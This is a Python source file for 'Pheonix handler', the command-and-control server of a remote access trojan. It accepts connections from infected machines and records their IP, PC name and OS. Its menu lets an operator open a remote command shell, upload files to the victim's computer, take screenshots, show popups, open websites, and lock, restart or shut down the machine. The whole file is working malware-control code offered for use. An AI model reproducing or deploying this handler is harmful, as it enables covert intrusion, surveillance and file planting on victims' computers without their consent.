import socket, os, time, threading, sys
from queue import Queue

#Banner
def banner(banner):
    File = open(banner, "r")
    banner = File.read()
    File.close()
    return banner

print("\033[93m" + banner("banner.txt") + "\033[0m")
print("\n\nWelcome to Pheonix handler!")

#Threadings variables
Threads = 2 #nb of threads
Jobs = [1, 2] #arrays of jobs
queue = Queue()

#connection variables
lHOST = input("Please enter host ip adress (LHOST): ")
lPORT = int(input("please enter host port (LPORT): "))

#connections log and infos
Connections = []
Adresses = []

#packets properties and func
Buffer = 1024 #buffer size
decode_utf = lambda data: data.decode("utf-8")
remove_quote = lambda string: string.replace("\"", "")
send = lambda data: conn.send(data)
recv = lambda buffer: conn.recv(buffer)

#######INIT SERVER######
def create_socket():
    global objSocket

    try:
        objSocket = socket.socket()
        objSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error() as strError:

        print(f"Error creating socket: {strError}")

def socket_bind():
    global objSocket

    try:
        print(f"<> Listening on port: {lPORT}")
        objSocket.bind((lHOST, lPORT))
        objSocket.listen(20)

    except Exception as strError:
        print(f"Error binding socket: {strError}")
        socket_bind()

def socket_accept():

    while True:
        try:
            conn, address = objSocket.accept()
            conn.setblocking(1) #no timeout
            Connections.append(conn)
            client_info = decode_utf(conn.recv(Buffer)).split("<><>")
            address += client_info[0], client_info[1], client_info[2]
            Adresses.append(address)
            print("\n" + "Connection established: {0} ({1})".format(address[0], address[2]))

        except socket.error:
            print("Error accepting connections...")
            continue
######################

###SERVER UTILITIES###

center = lambda string, title: f"{{:^{len(string)}}}".format(title)

def recvall(buffer):
    bytdata = b""
    while True:
        bytpart = recv(buffer)
        if len(bytpart) == buffer:
            return bytpart
        
        bytdata += bytpart

        if len(bytdata) == buffer:
            return bytdata

def menu_help(helpMenuNumber):
    if helpMenuNumber == 1:
        print("\n" + "help (--h) : shows this menu")
        print("list (--l) : List all connections")
        print("exit (--x) : exit from all the connections")
        print("select <id> (--s) : select a connection to interact with (using the connection id)")
    elif helpMenuNumber == 2:
        print("\n<>interaction with connected client zone<>")
        print("\n===help commands menu===")
        print("help : show this page")
        print("msg <message> : sends a popup windows with the message to the client")
        print("open <www.website.com> : opens the website inta a web browser page")
        print("lock : logs out the client from the session")
        print("shutdown : turn off the computer of the client")
        print("restart : restarts the computer of the client")
        print("upload <file> <destination>: uploads a file to the chosen destination on the client computer ")
        print("shell : summons a command prompt")
        print("screenshot : takes a screenshot of the client and save it into 'screenshots/'")
        print("stop : closes the connection with the client")
        print("back : take you back to main menu, without closing client connection")
        print("========================")

def list_connections():
    if len(Connections) > 0:
        strClients = ""

        for intCounter, conn in enumerate(Connections):
            strClients += str(intCounter) + 4*"  " + str(Adresses[intCounter][0]) + 4*"  " + \
                str(Adresses[intCounter][1]) + 4*"  " + str(Adresses[intCounter][2]) + 4*"  " + \
                str(Adresses[intCounter][3]) + "\n"

        print("\n" + "ID" + 2*" "+ center(str(Adresses[0][0]), "IP" ) + 13*" " +
        center(str(Adresses[0][1]), "PORT") + 4*" " +
        center(str(Adresses[0][2]), "PC_NAME") + 8*" " + 
        center(str(Adresses[0][3]), "OS") +"\n" + strClients, end="")

    else:
        print("No connections")

def close():
    global Connections, Adresses

    if len(Adresses) == 0:
        return
    for intCounter, conn in enumerate(Connections):
        conn.send(str.encode("exit"))
        conn.close()
    del Connections; arrConnections = []
    del Adresses; arrAdresses = []

def select_connection(connection_id, getResponse):
    global conn, Info, connAdress
    try:
        connection_id = int(connection_id)
        conn = Connections[connection_id]
        connAdress = Adresses[connection_id]
    except:
        print("Invalid choice, please try again")
        return
    else:
        Info = str(Adresses[connection_id][0]), str(Adresses[connection_id][2]), \
        str(Adresses[connection_id][3]), \
        str(Adresses[connection_id][4])
    
    if getResponse == "True":
        print("\nyou have selected <> " + Info[0])
    
    return conn

def send_command():
    menu_help(2)

    while True:
        strChoice = input("\n" + "Type command > ")

        if strChoice[:3] == "msg" and len(strChoice) > 3:
            strMsg = "msg<>" + strChoice[4:]
            send(str.encode(strMsg))

        elif strChoice[:4] == "open" and len(strChoice) > 4:
            strSite = "open<>" + strChoice[5:]
            send(str.encode(strSite))
        
        elif strChoice == "stop":
            send(str.encode("exit<>"))
            Connections.remove(conn)
            Adresses.remove(connAdress)
            main_menu()
            break
        
        elif strChoice[:6] == "upload":
            upload(strChoice[7:])

        elif strChoice == "lock":
            send(str.encode("lock<>"))

        elif strChoice == "shutdown":
            send(str.encode("shutdown<>"))
            main_menu()
            break

        elif strChoice == "restart":
            send(str.encode("restart<>"))
            main_menu()
            break

        elif strChoice == "shell":
            command_shell()
        
        elif strChoice == "screenshot":
            screenshot()

        elif strChoice == "lock":
            send(str.encode("lock<>"))
        
        elif strChoice == "help":
            menu_help(2)
        
        elif strChoice == "back":
            main_menu()
            break

def command_shell():

    send(str.encode("cmd<>"))
    strDefault = "\n" + decode_utf(recv(Buffer)) + ">"
    print(strDefault, end="")

    while True:

        strCommand = input()

        if strCommand == "quit" or strCommand == "exit":
            send(str.encode("cmd<>exit"))
            break
        
        elif len(str(strCommand)) > 0:
            send(str.encode(strCommand))
            responseBuffer = int(decode_utf(recv(Buffer)))
            strClientResponse = decode_utf(recvall(responseBuffer))
            print(strClientResponse, end="")

        else:
            print(strDefault, end="")

def upload(fileAndPath):
    fileAndPath = fileAndPath.split()
    
    try:
        objFile = open(fileAndPath[0], "rb")

        if "/" in fileAndPath[0]:
            path, filename =  os.path.split(fileAndPath[0])
        else:
            filename = fileAndPath[0]
        print(filename)

        intBuffer = os.path.getsize(fileAndPath[0])

        send(str.encode("upload<>" + str(intBuffer)))

        print(f"uploading size: {str(os.path.getsize(fileAndPath[0]))} bytes...")

        time.sleep(1)

        send(objFile.read())
        objFile.close()

        time.sleep(1)

        send(str.encode(f"{fileAndPath[1]}/{filename}"))
        print(fileAndPath)
        strMessage = decode_utf(recv(Buffer))
        print(strMessage)
    except:
        print("invalid file/path")

def screenshot():
    send(str.encode("screenshot<>"))
    objReceived = decode_utf(recv(Buffer))
    print("\n" + objReceived)

    intBuffer = ""
    for intCounter in range(0, len(objReceived)):
        if objReceived[intCounter].isdigit():
            intBuffer += objReceived[intCounter]
    
    intBuffer = int(intBuffer)
    print(intBuffer)
    strFile = time.strftime("%Y-%m-%d-%H-%M-screenshot" + ".png")
    ScrnData = recvall(intBuffer)
    objPic = open("screenshots/" + strFile, "wb")
    objPic.write(ScrnData); objPic.close()

    print("screenshot sucessfully saved into screenshots/")
    print(f"total bytes received = {os.path.getsize('screenshots/' + strFile)} bytes")

######################

#server main session
def main_menu():
    menu_help(1)
    while True:
        strChoice = input("\n" + "> ")

        if strChoice == "list" or strChoice == "--l":
            list_connections()

        elif strChoice[:9] == "selection" and len(strChoice) > 9 or strChoice[:3] == "--s" and len(strChoice) > 3:
            conn = select_connection(strChoice.split()[1], "True")
            if conn is not None:
                send_command()
                break
        

        elif strChoice == "exit" or strChoice == "--x":
            close()
            break
        else:
            print("invalid input, try again")
            menu_help(1)

#####Threading######

def create_threads():
    for _ in range(Threads):
        objThread = threading.Thread(target=work)
        objThread.daemon = True
        objThread.start()
    
    queue.join()

def work():
    while True:
        intValue = queue.get()

        if intValue == 1:
            create_socket()
            socket_bind()
            socket_accept()

        elif intValue == 2:
            while True:
                time.sleep(0.2)
                if len(Adresses) > 0:
                    main_menu()
                    break
        
        queue.task_done()
        queue.task_done()
        sys.exit(0)

def create_jobs():
    for intThreads in Jobs:
        queue.put(intThreads)
    queue.join()

##################

#Launch it
create_threads()
create_jobs()